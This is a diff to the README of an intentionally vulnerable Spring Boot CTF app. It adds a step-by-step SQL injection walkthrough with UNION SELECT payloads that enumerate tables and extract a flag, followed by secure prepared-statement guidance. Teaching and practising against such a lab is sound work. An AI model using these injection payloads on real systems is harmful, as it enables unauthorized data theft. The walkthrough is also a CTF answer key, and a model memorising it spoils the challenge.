@@ -1,7 +1,7 @@
 # Security CTF - OWASP Top 10 Challenge
 
 This Spring Boot application is designed as a Capture The Flag (CTF) security challenge based on the OWASP Top 10
-vulnerabilities. The current implementation includes challenges for **Broken Object Level Authorization** and **JWT Algorithm Confusion**.
+vulnerabilities. The current implementation includes challenges for **Broken Object Level Authorization**, **JWT Algorithm Confusion**, and **SQL Injection**.
 
 ## Vulnerability: Broken Object Level Authorization
 
@@ -12,6 +12,10 @@ the right to access the requested resource.
 ## Vulnerability: JWT Algorithm Confusion
 
 The application accepts JWT tokens with "none" algorithm, allowing attackers to forge tokens without a signature.
+
+## Vulnerability: SQL Injection
+
+The application contains multiple vulnerable endpoints that allow SQL injection attacks:
 
 ## How to Run
 
@@ -102,6 +106,45 @@ Forge a JWT token to access the admin secret.
     - Use the forged token to access `/api/auth/admin/secret`
     - The flag will be returned in the response
 
+## SQL Injection Challenge Walkthrough
+
+### Objective
+
+Exploit SQL injection vulnerabilities to access the hidden flag in the `ctf_secrets` table.
+
+### Steps to Solve
+
+1. **Reconnaissance**
+    - Test the search endpoint: `/api/shop/search?name=Laptop`
+    - Note: Use "Laptop" with capital L to find "Laptop Dell XPS 13"
+
+2. **Identify SQL injection points**
+    - Try basic injection: `/api/shop/search?name=Laptop'`
+    - Observe error messages that reveal SQL query structure
+    - The query uses `LIKE '%input%'` format
+
+3. **Determine number of columns**
+    - Use ORDER BY technique: `/api/shop/search?name=Laptop' ORDER BY 1-- `
+    - Continue until error: `/api/shop/search?name=Laptop' ORDER BY 6-- ` (should fail at 6, meaning 5 columns)
+
+4. **Identify displayable columns and types**
+    - The columns are: id (BIGINT), name (VARCHAR), price (DECIMAL), description (TEXT), category (VARCHAR)
+    - Use UNION SELECT with correct types: `/api/shop/search?name=Laptop' UNION SELECT 999,'test',99.99,'description','category'-- `
+    - Note which columns are displayed in the response
+
+5. **Database reconnaissance**
+    - Get database version: `/api/shop/search?name=Laptop' UNION SELECT 999,version(),99.99,'DB Version','info'-- `
+    - Get current database: `/api/shop/search?name=Laptop' UNION SELECT 999,current_database(),99.99,'Current DB','info'-- `
+    - List tables: `/api/shop/search?name=Laptop' UNION SELECT 999,table_name,99.99,'Table','info' FROM information_schema.tables WHERE table_schema='public'-- `
+
+6. **Explore the secrets table**
+    - List columns: `/api/shop/search?name=Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='ctf_secrets'-- `
+
+7. **Extract the flag**
+    - Get the flag: `/api/shop/search?name=Laptop' UNION SELECT 999,flag,99.99,description,'FLAG' FROM ctf_secrets WHERE challenge_name='sql_injection'-- `
+
+
+
 ## Security Concepts Demonstrated
 
 - **Broken Object Level Authorization**: The application fails to verify if the authenticated user has the right to
@@ -109,6 +152,8 @@ Forge a JWT token to access the admin secret.
 - **Sensitive Data Exposure**: The vulnerable endpoint exposes sensitive user information including address, phone
   number, and secret notes.
 - **JWT Algorithm Confusion**: Accepting "none" algorithm allows attackers to create unsigned tokens.
+- **SQL Injection**: Direct string concatenation in SQL queries allows attackers to manipulate database queries and access unauthorized data.
+- **Information Disclosure**: Error messages reveal database structure and query details to attackers.
 
 ## Proper Security Implementation
 
@@ -178,6 +223,40 @@ public class SecureJwtService {
 - **Validate all claims** (issuer, audience, expiration)
 - **Use HTTPS only** in production
 - **Store tokens securely** on the client side
+
+### Secure SQL Implementation
+
+A secure SQL implementation should always use prepared statements and parameterized queries:
+
+```java
+@GetMapping("/search")
+public ResponseEntity<?> searchProductsSecure(@RequestParam String productName) {
+    try (Connection connection = dataSource.getConnection()) {
+        // SECURE: Use prepared statement with parameters
+        String query = "SELECT id, name, price, description, category FROM products WHERE name LIKE ?";
+        
+        PreparedStatement statement = connection.prepareStatement(query);
+        statement.setString(1, "%" + productName + "%");
+        ResultSet resultSet = statement.executeQuery();
+        
+        // Process results...
+        
+    } catch (Exception e) {
+        // SECURE: Don't expose internal error details
+        return ResponseEntity.status(500).body(Map.of("error", "Search failed"));
+    }
+}
+```
+
+**Key security principles for SQL:**
+- **Always use prepared statements** with parameterized queries
+- **Never concatenate user input** directly into SQL strings
+- **Validate and sanitize input** before processing
+- **Use least privilege** database accounts
+- **Don't expose database errors** to end users
+- **Implement proper logging** for security monitoring
+- **Use stored procedures** when appropriate
+- **Apply input length limits** to prevent buffer overflows
 
 ## Additional Notes
 
